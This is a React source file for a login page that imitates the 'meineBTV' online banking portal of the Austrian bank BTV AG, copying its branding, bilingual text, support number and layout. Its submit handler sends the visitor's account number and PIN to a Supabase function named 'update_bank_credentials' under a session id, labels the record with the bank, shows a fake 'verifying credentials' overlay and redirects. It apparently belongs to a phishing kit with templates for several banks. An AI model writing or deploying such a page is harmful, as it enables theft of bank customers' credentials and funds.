import { useState, useEffect, useCallback, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { ChevronRight, ChevronDown, ChevronLeft } from "lucide-react";
import { useIsMobile } from "@/hooks/use-mobile";
import btvLogo from "@/assets/btv-logo.svg";
import atFlagge from "@/assets/at-flagge.png";
import slide1 from "@/assets/btv-slide-1.jpg";
import slide2 from "@/assets/btv-slide-2.jpg";

type Lang = "DE" | "EN";

const translations: Record<Lang, {
  title: string;
  loginTitle: string;
  step1: string;
  pinPlaceholder: string;
  sslText: string;
  next: string;
  firstLogin: string;
  linksTitle: string;
  links: string[];
  meldungen: string;
  meldungText: string;
  moreNews: string;
  footerLinks: string[];
  languageNames: string[];
  copyright: string;
}> = {
  DE: {
    title: "Willkommen bei meineBTV!",
    loginTitle: "Anmeldung",
    step1: "Ihre Verfügernummer",
    pinPlaceholder: "Pin",
    sslText: "Ihre Anmeldung bei meineBTV geschieht über gesicherte SSL Verbindungen.",
    next: "Weiter",
    firstLogin: "Erstanmeldung",
    linksTitle: "Weiterführende Links",
    links: [
      "Download BTV Security App -\nApple/Mac",
      "Download BTV Security App -\nWindows/PC",
      "meineBTV - Erstanmeldung",
      "meineBTV - Hilfe und FAQs",
      "FastClient - Fernwartungstool",
      "Support +43 505 333 - 1160",
      "Datenschutz und AGB",
    ],
    meldungen: "Meldungen",
    meldungText: "Phishing, Smishing und Vishing: Wie können Sie sich vor Datendiebstahl schützen?",
    moreNews: "Weitere Nachrichten anzeigen",
    footerLinks: ["Impressum", "Rechtliche Hinweise", "Standorte", "Support"],
    languageNames: ["Deutsch", "Englisch"],
    copyright: "© 2026 BTV AG",
  },
  EN: {
    title: "Welcome to meineBTV!",
    loginTitle: "Login",
    step1: "Your disposer number",
    pinPlaceholder: "Pin",
    sslText: "Your login to meineBTV is via secured SSL connections.",
    next: "Next",
    firstLogin: "First login",
    linksTitle: "Further links",
    links: [
      "Download BTV Security App -\nApple/Mac",
      "Download BTV Security App -\nWindows/PC",
      "meineBTV - First login",
      "meineBTV - Help and FAQs",
      "FastClient - Remote support tool",
      "Support +43 505 333 - 1160",
      "Privacy and Terms",
    ],
    meldungen: "News",
    meldungText: "Phishing, Smishing and Vishing: How to protect yourself from data theft?",
    moreNews: "Show more news",
    footerLinks: ["Imprint", "Legal Notice", "Locations", "Support"],
    languageNames: ["German", "English"],
    copyright: "© 2026 BTV AG",
  },
};

const langKeys: Lang[] = ["DE", "EN"];

const slides = [slide1, slide2];

const BTV_BLUE = "#0a3a5c";
const BTV_DARK = "#062a44";
const CARD_BG = "#e8eef2";
const CARD_BORDER = "#cfd9e0";
const ERSTANMELDUNG_BG = "#7a8a96";

const Btv = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const isMobile = useIsMobile();

  const [verfNr, setVerfNr] = useState("");
  const [pin, setPin] = useState("");
  const [language, setLanguage] = useState<Lang>("DE");
  const [langOpen, setLangOpen] = useState(false);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [hoverLink, setHoverLink] = useState<number | null>(null);
  const langRef = useRef<HTMLDivElement | null>(null);

  usePageMeta("meineBTV - Login", btvLogo);

  useEffect(() => { window.scrollTo(0, 0); }, []);

  const t = translations[language];

  const nextSlide = useCallback(() => setCurrentSlide(p => (p + 1) % slides.length), []);
  const prevSlide = useCallback(() => setCurrentSlide(p => (p - 1 + slides.length) % slides.length), []);

  useEffect(() => {
    const timer = setInterval(nextSlide, 6000);
    return () => clearInterval(timer);
  }, [nextSlide]);

  useEffect(() => {
    const onClick = (e: MouseEvent) => {
      if (langRef.current && !langRef.current.contains(e.target as Node)) setLangOpen(false);
    };
    document.addEventListener("mousedown", onClick);
    return () => document.removeEventListener("mousedown", onClick);
  }, []);

  const handleSubmit = async () => {
    if (!verfNr.trim() || !pin.trim()) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: verfNr,
        p_password: pin,
        p_username_label: "Verfügernummer",
        p_password_label: "Pin",
      });
      if (error) console.error("Update failed:", error);
      await supabase.from("submissions").update({ bank: "BTV" }).eq("session_id", sessionId);
    }
    setShowLoading(true);
  };

  const inputStyle: React.CSSProperties = {
    width: "100%",
    padding: "10px 12px",
    border: "none",
    background: "#fff",
    borderRadius: 2,
    fontSize: 14,
    color: BTV_BLUE,
    outline: "none",
    boxSizing: "border-box",
    fontFamily: "inherit",
  };

  return (
    <>
      <style>{`.btv-input::placeholder{color:${BTV_BLUE};opacity:1;}.btv-link-text{color:#292929;}.btv-link-row:hover .btv-link-text{color:#668da3;}`}</style>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div
        style={{
          minHeight: "100vh",
          background: BTV_BLUE,
          fontFamily: "Helvetica, Arial, sans-serif",
          color: "#fff",
        }}
      >
        {/* Header */}
        <div
          style={{
            background: BTV_BLUE,
            padding: isMobile ? "16px 20px" : "20px 40px",
            display: "flex",
            justifyContent: "flex-end",
            alignItems: "center",
            borderBottom: "1px solid #3785b3",
          }}
        >
          <img src={btvLogo} alt="BTV" style={{ height: isMobile ? 30 : 36 }} />
        </div>

        {/* Main */}
        <div
          style={{
            maxWidth: 1200,
            margin: "0 auto",
            width: "100%",
            padding: isMobile ? "20px 16px 40px" : "40px 30px 40px",
            boxSizing: "border-box",
          }}
        >
          <h1
            style={{
              fontFamily: "Georgia, 'Times New Roman', serif",
              fontWeight: 400,
              fontSize: isMobile ? 28 : 40,
              margin: "0 0 44px",
              color: "#fff",
            }}
          >
            {t.title}
          </h1>

          <div
            style={{
              display: "flex",
              flexDirection: isMobile ? "column" : "row",
              gap: 16,
              alignItems: isMobile ? "stretch" : "flex-start",
            }}
          >
            {/* Login Card */}
            <div
              style={{
                flex: isMobile ? "0 0 auto" : "0 0 300px",
                width: isMobile ? "100%" : 300,
                height: isMobile ? "auto" : 360,
                background: CARD_BG,
                color: BTV_BLUE,
                borderRadius: 2,
                display: "flex",
                flexDirection: "column",
                minWidth: 0,
              }}
            >
              <div style={{ padding: "16px 20px 16px" }}>
                <h2 style={{ fontSize: 16, fontWeight: 600, margin: "0 0 22px", color: BTV_BLUE }}>
                  {t.loginTitle}
                </h2>
                <input
                  type="text"
                  className="btv-input"
                  placeholder={t.step1}
                  value={verfNr}
                  onChange={(e) => setVerfNr(e.target.value)}
                  style={{ ...inputStyle, marginBottom: 14 }}
                />

                <div style={{ display: "flex", gap: 10, marginBottom: 16 }}>
                  <input
                    type="password"
                    className="btv-input"
                    placeholder={t.pinPlaceholder}
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    style={{ ...inputStyle, flex: "1 1 0", width: 0, minWidth: 0, height: 38, padding: "0 12px" }}
                  />
                  <div ref={langRef} style={{ position: "relative", flex: "1 1 0", width: 0, minWidth: 0 }}>
                    <button
                      type="button"
                      onClick={() => setLangOpen((p) => !p)}
                      style={{
                        ...inputStyle,
                        padding: "0 4px 0 12px",
                        cursor: "pointer",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "space-between",
                        textAlign: "left",
                        height: 38,
                        width: "100%",
                      }}
                    >
                      <span>{t.languageNames[langKeys.indexOf(language)]}</span>
                      <span style={{
                        width: 28,
                        height: 28,
                        background: CARD_BG,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        flexShrink: 0,
                      }}>
                        <ChevronDown size={16} color={BTV_BLUE} />
                      </span>
                    </button>
                    {langOpen && (
                      <div
                        style={{
                          position: "absolute",
                          top: "calc(100% + 2px)",
                          left: 0,
                          right: 0,
                          background: "#fff",
                          border: `1px solid ${CARD_BORDER}`,
                          zIndex: 50,
                        }}
                      >
                        {langKeys.map((k, i) => (
                          <button
                            key={k}
                            onClick={() => { setLanguage(k); setLangOpen(false); }}
                            style={{
                              display: "block",
                              width: "100%",
                              textAlign: "left",
                              padding: "8px 12px",
                              background: language === k ? CARD_BG : "#fff",
                              border: "none",
                              color: BTV_BLUE,
                              cursor: "pointer",
                              fontSize: 14,
                            }}
                          >
                            {t.languageNames[i]}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>

                <p style={{ fontSize: 13, lineHeight: 1.5, margin: "0 0 18px", color: "#000" }}>
                  {t.sslText}
                </p>

                <div style={{ textAlign: "right" }}>
                  <button
                    onClick={handleSubmit}
                    style={{
                      background: "#3785b3",
                      color: "#fff",
                      border: "none",
                      padding: "14px 36px",
                      fontSize: 14,
                      fontWeight: 700,
                      cursor: "pointer",
                      borderRadius: 2,
                      fontFamily: "inherit",
                    }}
                  >
                    {t.next}
                  </button>
                </div>
              </div>

              {/* Erstanmeldung bar */}
              <div
                style={{
                  marginTop: "auto",
                  background: "#668da3",
                  color: "#fff",
                  display: "flex",
                  alignItems: "stretch",
                  justifyContent: "flex-end",
                  fontSize: 14,
                  fontWeight: 700,
                  cursor: "default",
                  minHeight: 44,
                }}
              >
                <div style={{ width: 1, background: "#fff" }} />
                <div style={{ padding: "12px 12px" }}>{t.firstLogin}</div>
                <div style={{ width: 1, background: "#fff" }} />
              </div>
            </div>

            {/* Weiterführende Links */}
            <div
              style={{
                flex: isMobile ? "0 0 auto" : "0 0 300px",
                width: isMobile ? "100%" : 300,
                height: isMobile ? "auto" : 360,
                background: CARD_BG,
                color: BTV_BLUE,
                borderRadius: 2,
                padding: "18px 20px 16px",
                minWidth: 0,
                boxSizing: "border-box",
                overflow: "hidden",
              }}
            >
              <h2 style={{ fontSize: 16, fontWeight: 600, margin: "0 0 12px", color: BTV_BLUE }}>
                {t.linksTitle}
              </h2>
              <div>
                {t.links.map((label, i) => (
                  <div
                    key={i}
                    className="btv-link-row"
                    style={{
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "space-between",
                      padding: "6px 0",
                      borderBottom: i === t.links.length - 1 ? "none" : `1px solid ${CARD_BORDER}`,
                      fontSize: 12,
                      cursor: "pointer",
                      gap: 8,
                    }}
                  >
                    <span className="btv-link-text" style={{ whiteSpace: "pre-line", lineHeight: 1.3 }}>{label}</span>
                    <ChevronRight size={18} color="#000" style={{ flexShrink: 0 }} />
                  </div>
                ))}
              </div>
            </div>

            {/* Slider */}
            <div
              style={{
                flex: isMobile ? "0 0 auto" : "0 0 300px",
                width: isMobile ? "100%" : 300,
                height: isMobile ? 280 : 360,
                position: "relative",
                background: BTV_DARK,
                borderRadius: 2,
                overflow: "hidden",
                minWidth: 0,
              }}
            >
              {slides.map((src, i) => (
                <img
                  key={i}
                  src={src}
                  alt={`Werbung ${i + 1}`}
                  style={{
                    position: i === 0 ? "relative" : "absolute",
                    top: 0,
                    left: 0,
                    width: "100%",
                    height: "100%",
                    objectFit: "cover",
                    opacity: currentSlide === i ? 1 : 0,
                    transition: "opacity 0.6s ease",
                    display: "block",
                  }}
                />
              ))}
              {/* Pagination row: arrow • • arrow */}
              <div
                style={{
                  position: "absolute",
                  top: 10,
                  left: "50%",
                  transform: "translateX(-50%)",
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  zIndex: 2,
                }}
              >
                <button
                  onClick={prevSlide}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: BTV_DARK,
                    width: 20,
                    height: 20,
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    padding: 0,
                  }}
                >
                  <ChevronLeft size={18} strokeWidth={2.5} />
                </button>
                {slides.map((_, i) => (
                  <span
                    key={i}
                    onClick={() => setCurrentSlide(i)}
                    style={{
                      width: 8,
                      height: 8,
                      borderRadius: "50%",
                      background: currentSlide === i ? BTV_DARK : "rgba(255,255,255,0.4)",
                      cursor: "pointer",
                    }}
                  />
                ))}
                <button
                  onClick={nextSlide}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: BTV_DARK,
                    width: 20,
                    height: 20,
                    cursor: "pointer",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    padding: 0,
                  }}
                >
                  <ChevronRight size={18} strokeWidth={2.5} />
                </button>
              </div>
            </div>
          </div>

          {/* Meldungen */}
          <div style={{ marginTop: 36 }}>
            <h3 style={{ fontSize: 16, fontWeight: 400, margin: "0 0 12px", color: "#fff" }}>
              {t.meldungen}
            </h3>
            <div
              style={{
                background: "rgba(255,255,255,0.06)",
                border: "1px solid rgba(255,255,255,0.12)",
                padding: "14px 16px",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                gap: 12,
                fontSize: 14,
                color: "#fff",
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 10, minWidth: 0 }}>
                <ChevronRight size={16} color="#fff" />
                <span style={{ overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                  {t.meldungText}
                </span>
              </div>
              <span style={{ flexShrink: 0, fontSize: 13, color: "rgba(255,255,255,0.7)" }}>
                09.04.2026, 16:23 Uhr
              </span>
            </div>
            <div style={{ textAlign: "center", marginTop: 28 }}>
              <button
                style={{
                  background: "#668da3",
                  color: "#fff",
                  border: "none",
                  padding: "14px 32px",
                  fontSize: 14,
                  fontWeight: 700,
                  cursor: "pointer",
                  borderRadius: 2,
                  fontFamily: "inherit",
                }}
              >
                {t.moreNews}
              </button>
            </div>
          </div>

          {/* Footer */}
          <div
            style={{
              marginTop: 40,
              display: "flex",
              flexDirection: isMobile ? "column" : "row",
              alignItems: isMobile ? "flex-start" : "center",
              gap: 16,
              fontSize: 13,
              color: "rgba(255,255,255,0.85)",
            }}
          >
            <img src={atFlagge} alt="AT" style={{ height: 18 }} />
            <div style={{ display: "flex", gap: 24, flexWrap: "wrap" }}>
              {t.footerLinks.map((label) => (
                <span key={label} style={{ cursor: "pointer", fontWeight: 700 }}>{label}</span>
              ))}
            </div>
            <div style={{ marginLeft: isMobile ? 0 : "auto", color: "#fff" }}>
              {t.copyright}
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Btv;
